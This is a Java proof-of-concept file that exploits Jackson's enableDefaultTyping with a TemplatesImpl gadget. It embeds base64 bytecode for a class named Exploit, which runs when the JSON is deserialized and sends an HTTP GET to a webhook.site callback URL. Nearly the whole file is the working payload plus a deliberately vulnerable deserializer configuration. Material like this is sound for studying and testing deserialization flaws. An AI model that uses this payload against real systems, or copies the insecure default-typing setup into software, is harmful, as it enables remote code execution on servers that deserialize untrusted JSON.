import com.fasterxml.jackson.core.JsonParseException;
import com.fasterxml.jackson.databind.JsonMappingException;
import com.fasterxml.jackson.databind.ObjectMapper;

public class Main {

  private static ObjectMapper deserializer = new ObjectMapper()
    .enableDefaultTyping();

  public static void main(String[] args) {
    try {
      // This is the vulneurable json input.
      String request =
        "{\n" +
        "  \"name\": \"fakeapple\",\n" +
        "  \"description\": \"Fake fruit from UK\",\n" +
        "  \"data\": [\"org.apache.xalan.xsltc.trax.TemplatesImpl\",\n" +
        "  {\n" +
        "    \"transletBytecodes\" : [\"yv66vgAAADQAXgoAAgAtBwAuCQACAC8JADAAMQgAMgoAMwA0BwA1CgAHAC0HADYIADcKAAkAOAoACQA5BwA6CAA7CgANADwHAD0HAD4KAA0APwoAEQBACgAQAEEKABAAQgoABwBDCgAQAEQIAEUHAEYBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQANU3RhY2tNYXBUYWJsZQcARgcANQcANgcAOgcAPQcARwEACkV4Y2VwdGlvbnMHAEgBAAl0cmFuc2Zvcm0BAFAoTG9yZy9hcGFjaGUveGFsYW4veHNsdGMvRE9NO1tMb3JnL2FwYWNoZS94bWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgcASQEAcyhMb3JnL2FwYWNoZS94YWxhbi94c2x0Yy9ET007TG9yZy9hcGFjaGUveG1sL2R0bS9EVE1BeGlzSXRlcmF0b3I7TG9yZy9hcGFjaGUveG1sL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApTb3VyY2VGaWxlAQAMRXhwbG9pdC5qYXZhDAAaABsBAC9vcmcvYXBhY2hlL3hhbGFuL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAwASgBLBwBMDABNAE4BABNUaGlzIGlzIHRoZSBleHBsb2l0BwBPDABQAFEBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEADGphdmEvbmV0L1VSTAEAOWh0dHBzOi8vd2ViaG9vay5zaXRlLzA0MTg4ZTY4LTY4Y2QtNDgxNi05ZTdlLTRiMmI1ZDAzODI0NQwAGgBRDABSAFMBABpqYXZhL25ldC9IdHRwVVJMQ29ubmVjdGlvbgEAA0dFVAwAVABRAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIMAFUAVgwAGgBXDAAaAFgMAFkAWgwAWwBcDABdABsBABBJbnNpZGUgdGhlIGNsYXNzAQAHRXhwbG9pdAEAEGphdmEvbGFuZy9TdHJpbmcBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAob3JnL2FwYWNoZS94YWxhbi94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAD3RyYW5zbGV0VmVyc2lvbgEAAUkBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA5vcGVuQ29ubmVjdGlvbgEAGigpTGphdmEvbmV0L1VSTENvbm5lY3Rpb247AQAQc2V0UmVxdWVzdE1ldGhvZAEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEABWNsb3NlACEAGQACAAAAAAADAAEAGgAbAAIAHAAAANkABQAGAAAAaSq3AAEqEGW1AAOyAAQSBbYABrsAB1m3AAhMuwAJWRIKtwALTSy2AAzAAA1OLRIOtgAPuwAQWbsAEVkttgAStwATtwAUOgQZBLYAFVk6BcYADSsZBbYAFlen/+4ZBLYAF7IABBIYtgAGsQAAAAIAHQAAADoADgAAAAwABAANAAoADwASABEAGgASACQAFQAsABYAMgAXADsAGABGABsAUQAcAFsAHgBgAB8AaAAgAB4AAAAeAAL/AEYABQcAHwcAIAcAIQcAIgcAIwAA/AAUBwAkACUAAAAEAAEAJgABACcAKAACABwAAAAZAAAAAwAAAAGxAAAAAQAdAAAABgABAAAAJAAlAAAABAABACkAAQAnACoAAgAcAAAAGQAAAAQAAAABsQAAAAEAHQAAAAYAAQAAACwAJQAAAAQAAQApAAEAKwAAAAIALA==\"],\n" +
        "    \"transletName\": \"oops!\",\n" +
        "    \"outputProperties\": {}\n" +
        "   }\n" +
        "  ]\n" +
        " }";
      Product oo = deserializer.readValue(request, Product.class);
      System.out.println("Deserialiez obj = " + oo);
    } catch (Exception any) {
      System.out.println(any);
    }
  }
}
